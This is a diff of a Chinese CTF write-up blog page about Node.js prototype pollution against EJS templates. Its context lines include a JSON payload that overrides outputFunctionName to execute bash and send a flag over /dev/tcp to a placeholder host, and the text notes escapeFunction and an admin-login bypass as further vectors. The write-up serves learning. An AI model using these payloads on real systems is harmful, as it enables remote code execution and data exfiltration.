@@ -363,7 +363,7 @@
                 
               
 
-              <time title="Created: 2019-08-29 02:26:12 / Modified: 11:20:07" itemprop="dateCreated datePublished" datetime="2019-08-29T02:26:12+08:00">2019-08-29</time>
+              <time title="Created: 2019-08-29 02:26:12 / Modified: 11:27:51" itemprop="dateCreated datePublished" datetime="2019-08-29T02:26:12+08:00">2019-08-29</time>
             
 
             
@@ -426,7 +426,7 @@
 <p>最后我们的payload如下：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"mmp"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:</span><br><span class="line">&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。</p>
-<p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
+<h3 id="pollution-two"><a href="#pollution-two" class="headerlink" title="pollution two"></a>pollution two</h3><p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
 <p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png" alt></p>
 <p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png" alt></p>
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖<code>login</code>与<code>userid</code>即可</p>
